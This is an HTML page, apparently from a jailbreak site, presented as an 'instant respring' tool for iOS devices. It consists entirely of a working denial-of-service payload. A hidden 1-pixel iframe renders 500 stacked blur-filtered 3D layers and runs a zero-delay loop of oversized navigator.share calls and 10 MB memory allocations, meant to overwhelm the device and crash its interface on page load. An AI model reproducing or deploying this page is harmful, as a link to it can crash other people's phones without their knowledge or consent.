<!DOCTYPE html>
<html>
    <head>
        <title>respring</title>
        <meta name="description" content="instant respring for iOS devices"/>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta property="og:title" content="respring">
        <meta property="og:description" content="instant respring for iOS devices">
        <meta property="og:url" content="https://jailbreak.party/respring">
        <meta name="theme-color" content="#0074fb">
    </head>
    <body>
        <!--  big credit to @neonmodder123  -->
        <iframe id="frame" style="width: 1px;height: 1px;" srcdoc="" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
        <script>
            const frame = document.getElementById('frame');
            const respringScript = `
                <html>
                <body>
                    <script>
                        const container = document.createElement('div');
                        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
                        document.body.appendChild(container);
    
                        for (let i = 0; i < 500; i++) {
                            let d = document.createElement('div');
                            d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg);';
                            container.appendChild(d);
                        }
    
                        setInterval(() => {
                            navigator.share({ title: 'R', text: 'R'.repeat(100000) }).catch(() => {});
                            let x = new Uint8Array(1024 * 1024 * 10);
                            crypto.getRandomValues(x);
                        }, 0);
                    <\/script>
                </body>
                </html>
            `;
    
            frame.srcdoc = respringScript;
        </script>
    </body>
</html>
